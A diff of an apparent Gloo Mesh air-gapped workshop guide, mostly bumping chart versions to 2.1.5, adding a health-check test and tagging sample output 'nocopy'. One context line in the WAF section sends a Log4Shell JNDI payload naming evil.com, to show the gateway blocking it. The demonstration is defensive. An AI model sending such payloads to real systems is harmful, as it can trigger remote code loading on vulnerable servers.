@@ -183,14 +183,14 @@ do
   done
 done
 
-wget https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-agent/gloo-mesh-agent-2.1.4.tgz
-tar zxvf gloo-mesh-agent-2.1.4.tgz
+wget https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-agent/gloo-mesh-agent-2.1.5.tgz
+tar zxvf gloo-mesh-agent-2.1.5.tgz
 find gloo-mesh-agent -name "values.yaml" | while read file; do
   cat $file | yq eval -j | jq -r '.. | .image? | select(. != null) | (if .hub then .hub + "/" + .repository + ":" + .tag else (if .registry then (if .registry == "docker.io" then "docker.io/library" else .registry end) + "/" else "" end) + .repository + ":" + (.tag | tostring) end)'
 done | sort -u >> images.txt
 
-wget https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-enterprise/gloo-mesh-enterprise-2.1.4.tgz
-tar zxvf gloo-mesh-enterprise-2.1.4.tgz
+wget https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-enterprise/gloo-mesh-enterprise-2.1.5.tgz
+tar zxvf gloo-mesh-enterprise-2.1.5.tgz
 find gloo-mesh-enterprise -name "values.yaml" | while read file; do
   cat $file | yq eval -j | jq -r '.. | .image? | select(. != null) | (if .hub then .hub + "/" + .repository + ":" + .tag else (if .registry then (if .registry == "docker.io" then "docker.io/library" else .registry end) + "/" else "" end) + .repository + ":" + (.tag | tostring) end)'
 done | sort -u >> images.txt
@@ -218,7 +218,7 @@ done
 First of all, let's install the `meshctl` CLI:
 
 ```bash
-export GLOO_MESH_VERSION=v2.1.4
+export GLOO_MESH_VERSION=v2.1.5
 curl -sL https://run.solo.io/meshctl/install | sh -
 export PATH=$HOME/.gloo-mesh/bin:$PATH
 ```
@@ -263,7 +263,7 @@ helm repo update
 kubectl --context ${MGMT} create ns gloo-mesh 
 helm upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise \
 --namespace gloo-mesh --kube-context ${MGMT} \
---version=2.1.4 \
+--version=2.1.5 \
 --set glooMeshMgmtServer.ports.healthcheck=8091 \
 --set glooMeshMgmtServer.image.registry=${registry}/gloo-mesh \
 --set glooMeshUi.image.registry=${registry}/gloo-mesh \
@@ -288,7 +288,23 @@ until [[ $(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-mgmt-server 
 done
 -->
 Then, you need to set the environment variable to tell the Gloo Mesh agents how to communicate with the management plane:
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-exec');
 
+describe("MGMT server is healthy", () => {
+  let cluster = process.env.MGMT
+  let deployments = ["gloo-mesh-mgmt-server","gloo-mesh-redis","prometheus-server"];
+  deployments.forEach(deploy => {
+    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-mesh", k8sObj: deploy }));
+  });
+});
+EOF
+echo "executing test dist/gloo-mesh-2-0-all-airgap/build/templates/steps/deploy-and-register-gloo-mesh/tests/check-deployment.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
 <!--bash
 cat <<'EOF' > ./test.js
 const chaiExec = require("@jsdevtools/chai-exec");
@@ -383,7 +399,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set ext-auth-service.enabled=false \
   --set cluster=cluster1 \
   --set glooMeshAgent.image.registry=${registry}/gloo-mesh \
-  --version 2.1.4
+  --version 2.1.5
 ```
 
 Note that the registration can also be performed using `meshctl cluster register`.
@@ -419,7 +435,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set ext-auth-service.enabled=false \
   --set cluster=cluster2 \
   --set glooMeshAgent.image.registry=${registry}/gloo-mesh \
-  --version 2.1.4
+  --version 2.1.5
 ```
 
 You can check the cluster(s) have been registered correctly using the following commands:
@@ -1011,11 +1027,12 @@ kubectl --context ${CLUSTER1} create ns bookinfo-frontends
 kubectl --context ${CLUSTER1} create ns bookinfo-backends
 kubectl --context ${CLUSTER1} label namespace bookinfo-frontends istio.io/rev=1-15
 kubectl --context ${CLUSTER1} label namespace bookinfo-backends istio.io/rev=1-15
+
 # deploy the frontend bookinfo service in the bookinfo-frontends namespace
 kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
 kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
-# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
 kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f bookinfo.yaml -l 'account in (reviews,ratings,details)'
+# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
 kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details),version notin (v3)'
 # Update the productpage deployment to set the environment variables to define where the backend services are running
 kubectl --context ${CLUSTER1} -n bookinfo-frontends set env deploy/productpage-v1 DETAILS_HOSTNAME=details.bookinfo-backends.svc.cluster.local
@@ -1024,6 +1041,7 @@ kubectl --context ${CLUSTER1} -n bookinfo-frontends set env deploy/productpage-v
 kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${CLUSTER1}
 kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${CLUSTER1}
 ```
+
 
 <!--bash
 until [[ $(kubectl --context ${CLUSTER1} -n bookinfo-frontends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 1 ]]; do
@@ -1051,12 +1069,13 @@ kubectl --context ${CLUSTER2} create ns bookinfo-frontends
 kubectl --context ${CLUSTER2} create ns bookinfo-backends
 kubectl --context ${CLUSTER2} label namespace bookinfo-frontends istio.io/rev=1-15
 kubectl --context ${CLUSTER2} label namespace bookinfo-backends istio.io/rev=1-15
+
 # deploy the frontend bookinfo service in the bookinfo-frontends namespace
 kubectl --context ${CLUSTER2} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
 kubectl --context ${CLUSTER2} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
-# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions
 kubectl --context ${CLUSTER2} -n bookinfo-backends apply -f bookinfo.yaml -l 'account in (reviews,ratings,details)'
-kubectl --context ${CLUSTER2} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details)'
+# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions
+  kubectl --context ${CLUSTER2} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details)'
 # Update the productpage deployment to set the environment variables to define where the backend services are running
 kubectl --context ${CLUSTER2} -n bookinfo-frontends set env deploy/productpage-v1 DETAILS_HOSTNAME=details.bookinfo-backends.svc.cluster.local
 kubectl --context ${CLUSTER2} -n bookinfo-frontends set env deploy/productpage-v1 REVIEWS_HOSTNAME=reviews.bookinfo-backends.svc.cluster.local
@@ -1064,6 +1083,7 @@ kubectl --context ${CLUSTER2} -n bookinfo-frontends set env deploy/productpage-v
 kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${CLUSTER2}
 kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${CLUSTER2}
 kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v3 CLUSTER_NAME=${CLUSTER2}
+
 ```
 
 <!--bash
@@ -1291,7 +1311,7 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
 --set ext-auth-service.extAuth.image.registry=${registry}/gloo-mesh \
 --set rate-limiter.rateLimiter.image.registry=${registry}/gloo-mesh \
 --set rate-limiter.redis.image.registry=${registry} \
-  --version 2.1.4
+  --version 2.1.5
 
 helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --namespace gloo-mesh-addons \
@@ -1302,7 +1322,7 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
 --set ext-auth-service.extAuth.image.registry=${registry}/gloo-mesh \
 --set rate-limiter.rateLimiter.image.registry=${registry}/gloo-mesh \
 --set rate-limiter.redis.image.registry=${registry} \
-  --version 2.1.4
+  --version 2.1.5
 ```
 
 This is how to environment looks like now:
@@ -1841,7 +1861,7 @@ kubectl --context ${CLUSTER1} exec -t -n bookinfo-backends deploy/reviews-v1 \
 
 Now, the output should be like that:
 
-```
+```,nocopy
 ...
 Certificate chain
  0 s:
@@ -1871,7 +1891,7 @@ kubectl --context ${CLUSTER2} exec -t -n bookinfo-backends deploy/reviews-v1 \
 
 The output should be like that:
 
-```
+```,nocopy
 ...
 Certificate chain
  0 s:
@@ -2038,7 +2058,7 @@ kubectl --context ${CLUSTER1} exec -t -n bookinfo-backends deploy/reviews-v1 \
 
 The output should be like that:
 
-```
+```,nocopy
 ...
 Certificate chain
  0 s:
@@ -2081,7 +2101,7 @@ kubectl --context ${CLUSTER2} exec -t -n bookinfo-backends deploy/reviews-v1 \
 
 The output should be like that:
 
-```
+```,nocopy
 ...
 Certificate chain
  0 s:
@@ -3909,7 +3929,7 @@ curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://${ENDPOINT_HTTPS_GW
 
 The request should be rejected:
 
-```
+```,nocopy
 HTTP/2 403 
 content-length: 27
 content-type: text/plain
@@ -4934,7 +4954,7 @@ mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${te
 
 It's now time to deploy a Wasm filter on Istio !
 
-Gloo Mesh Enteprise has a `WasmDeploymentPolicy` CRD (Custom Resource Definition) for that purpose.
+Gloo Platform has a `WasmDeploymentPolicy` CRD (Custom Resource Definition) for that purpose.
 
 To deploy your Wasm filter on all the Pods corresponding to the version v1 of the reviews service and running in the bookinfo-backends namespace of the cluster1 cluster, use the following commands:
 
@@ -4995,17 +5015,18 @@ mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${te
 
 You should get either:
 
-```
+```,nocopy
 {'x-powered-by': 'Servlet/3.1', 'content-type': 'application/json', 'date': 'Tue, 15 Dec 2020 08:23:24 GMT', 'content-language': 'en-US', 'content-length': '295', 'x-envoy-upstream-service-time': '10', 'server': 'envoy'}
 ```
 
 or:
 
-```
+```,nocopy
 {'x-powered-by': 'Servlet/3.1', 'content-type': 'application/json', 'date': 'Tue, 15 Dec 2020 08:23:25 GMT', 'content-language': 'en-US', 'content-length': '295', 'x-envoy-upstream-service-time': '17', 'hello': 'Gloo Mesh Enterprise Beta', 'server': 'envoy'}
 ```
 
 We have deployed the Istio Bookinfo application with the versions `v1` and `v2` of the `reviews` service, so the new header is added half of the time.
+
 
 Delete the WasmDeploymentPolicy:
 
@@ -5030,7 +5051,7 @@ export VM_APP="vm1"
 VM_NAMESPACE="virtualmachines"
 WORK_DIR="vm1"
 SERVICE_ACCOUNT="vm1-sa"
-CLUSTER_NETWORK=$(kubectl --context ${CLUSTER1} -n istio-gateways get deploy -l istio=eastwestgateway -o json | jq -r '.items[0].spec.template.spec.containers[0].env | from_entries | .ISTIO_META_NETWORK')
+CLUSTER_NETWORK=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=eastwestgateway -ojson | jq -r '.items[0].metadata.labels["topology.istio.io/network"]')
 VM_NETWORK="vm-network"
 CLUSTER="${CLUSTER1}"
 ```
@@ -5554,7 +5575,7 @@ helm repo update
 kubectl --context ${MGMT2} create ns gloo-mesh 
 helm upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise \
 --namespace gloo-mesh --kube-context ${MGMT2} \
---version=2.1.4 \
+--version=2.1.5 \
 --set glooMeshMgmtServer.ports.healthcheck=8091 \
 --set glooMeshMgmtServer.image.registry=${registry}/gloo-mesh \
 --set prometheus.configmapReload.prometheus.image.repository=${registry}/jimmidyson/configmap-reload \
@@ -5718,7 +5739,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set rate-limiter.enabled=false \
   --set ext-auth-service.enabled=false \
   --set cluster=cluster1 \
-  --version 2.1.4
+  --version 2.1.5
 
 kubectl --context ${CLUSTER2} create ns gloo-mesh
 
@@ -5730,7 +5751,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set rate-limiter.enabled=false \
   --set ext-auth-service.enabled=false \
   --set cluster=cluster2 \
-  --version 2.1.4
+  --version 2.1.5
 ```
 
 Let's scale up the management plane:
